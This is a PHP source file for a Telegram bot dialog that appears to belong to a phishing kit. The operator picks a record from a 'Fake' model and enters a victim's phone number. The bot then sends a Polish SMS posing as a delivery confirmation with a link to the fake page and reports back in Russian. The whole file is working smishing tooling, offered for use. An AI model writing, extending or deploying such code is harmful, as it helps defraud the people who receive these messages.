<?php

namespace App\Telegram\Dialogs;

use App\Api\SmsApi;
use Log;
use App\Models\Fake;
use Telegram\Bot\Keyboard\Keyboard;
use Telegram\Bot\Exceptions\TelegramSDKException;

class SendSmsDialog extends Dialog
{
    protected $steps = [
        'getFake',
        'sendSms'
    ];

    public function getFake()
    {
        try {
            $btns = $this->getConfig('btns');
            $track_id = $this->getData('track_id');
            if (is_null($track_id)) {
                $text = "❗️ <b>Такой объявление не существует!</b>";
                $keyboard = Keyboard::make([
                    "keyboard" => [
                        [
                            ["text" => $btns->get('start') ?? ''],
                        ]
                    ],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
                $this->end();
            } else {
                $text = "❕ <i>Напишите номер телефона в формате </i><b>48889404173</b>";
                $keyboard = Keyboard::make([
                    "keyboard" => [
                        [
                            ["text" => $btns->get('back') ?? ''],
                        ]
                    ],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
            }
            $this->telegram->sendMessage([
                "chat_id" => $this->getChat()->getId(),
                "text" => $text,
                "parse_mode" => "html",
                "reply_markup" => $keyboard
            ]);

        } catch (TelegramSDKException $e) {
            Log::error($e->getMessage());
        }
    }

    public function sendSms()
    {
        try {
            $btns = $this->getConfig()['btns'];
            $number = trim($this->update->getMessage()->getText());
            if (!empty($number) && preg_match("/^\+?[0-9]{6,14}$/", $number)) {
                $this->setData('number', $number);
                $this->setData('error', false);
                $data = $this->getData()->only(['track_id', 'number'])->toArray();
                $fake = Fake::whereTrackId($data['track_id'])->first();
                $link = SmsApi::getSlug($data['number'], $fake->link());
                $result = SmsApi::sendSms($number, "Dostawa. Przejdź do potwierdzenia: $link", ucfirst($fake->category->name))->getData(true);
                if ($result['error']) {
                    $text = $this->makeText([
                        "❗️ <b>Ошибка</b>",
                        "",
                        "<i>{$result['msg']}</i>"
                    ]);
                } else {
                    $text = "<i>Сообщения успешно отправлен на номер</i> <b>$number</b>";
                }
                $keyboard = Keyboard::make([
                    "keyboard" => [
                        [["text" => $btns['start']]],
                    ],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => $text,
                    "parse_mode" => "html",
                    "reply_markup" => $keyboard
                ]);
            } else {
                $this->setData('error', true);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => "❗️ <i>Укажите правильный номер телефона</i>",
                    "parse_mode" => "html",
                ]);
                $this->jump('getFake');
                $this->proceed();
            }
        } catch (TelegramSDKException $e) {
            Log::error($e->getMessage());
        }
    }
}